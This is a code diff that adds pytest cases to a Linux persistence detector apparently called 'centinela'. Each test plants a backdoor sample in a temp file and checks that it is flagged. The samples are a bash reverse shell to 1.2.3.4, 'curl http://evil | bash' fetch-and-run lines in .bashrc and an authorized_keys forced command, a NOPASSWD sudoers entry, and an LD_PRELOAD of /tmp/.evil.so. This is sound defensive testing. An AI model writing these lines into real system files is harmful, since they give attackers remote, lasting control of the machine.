@@ -66,3 +66,57 @@ def test_suid_nuevo_se_detecta_contra_baseline(tmp_path):
 def test_available_sin_etc_en_windows():
     w = PersistenceCollector(bus=None)
     assert w.available() == (os.name == "posix" and os.path.isdir("/etc"))
+
+
+# ---- capas nuevas (laberinto) ----
+import centinela.collectors.persistence as P
+
+
+def test_ld_preload_es_critico(tmp_path, monkeypatch):
+    f = _mk(tmp_path / "preload", "/tmp/.evil.so\n")
+    monkeypatch.setattr(P, "_PRELOAD_FILES", (f,))
+    w = PersistenceCollector(bus=None)
+    evs = w._scan_preload(now=1.0)
+    assert len(evs) == 1 and evs[0].kind == "persistence_ld_preload"
+    assert int(evs[0].severity) == 4   # CRITICAL
+
+
+def test_init_profile_backdoor(tmp_path, monkeypatch):
+    f = _mk(tmp_path / "profile", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
+    monkeypatch.setattr(P, "_INIT_FILES", (f,))
+    monkeypatch.setattr(P, "_INIT_DIRS", ())
+    w = PersistenceCollector(bus=None)
+    evs = w._scan_init(now=1.0)
+    assert len(evs) == 1 and evs[0].kind == "persistence_init"
+
+
+def test_dotfile_bashrc_backdoor(tmp_path, monkeypatch):
+    _mk(tmp_path / ".bashrc", "curl http://evil/a | bash\n")
+    monkeypatch.setattr(PersistenceCollector, "_home_dirs",
+                        staticmethod(lambda: [str(tmp_path)]))
+    w = PersistenceCollector(bus=None)
+    evs = w._scan_dotfiles(now=1.0)
+    assert len(evs) == 1 and evs[0].kind == "persistence_profile"
+
+
+def test_sudoers_nopasswd_all(tmp_path, monkeypatch):
+    f = _mk(tmp_path / "sudoers", "eviluser ALL=(ALL) NOPASSWD: ALL\n")
+    monkeypatch.setattr(P, "_SUDOERS", (f,))
+    monkeypatch.setattr(P, "_SUDOERS_DIRS", ())
+    w = PersistenceCollector(bus=None)
+    evs = w._scan_sudoers(now=1.0)
+    assert len(evs) == 1 and evs[0].kind == "persistence_sudoers"
+
+
+def test_authkeys_forced_command(tmp_path, monkeypatch):
+    if os.name == "nt":
+        return
+    ssh = tmp_path / ".ssh"
+    ssh.mkdir()
+    _mk(ssh / "authorized_keys",
+        'command="curl http://evil|sh" ssh-rsa AAAA user@h\n')
+    monkeypatch.setattr(PersistenceCollector, "_home_dirs",
+                        staticmethod(lambda: [str(tmp_path)]))
+    w = PersistenceCollector(bus=None)
+    evs = w._scan_authkeys(now=1.0)
+    assert any(e.kind == "persistence_authkeys" for e in evs)
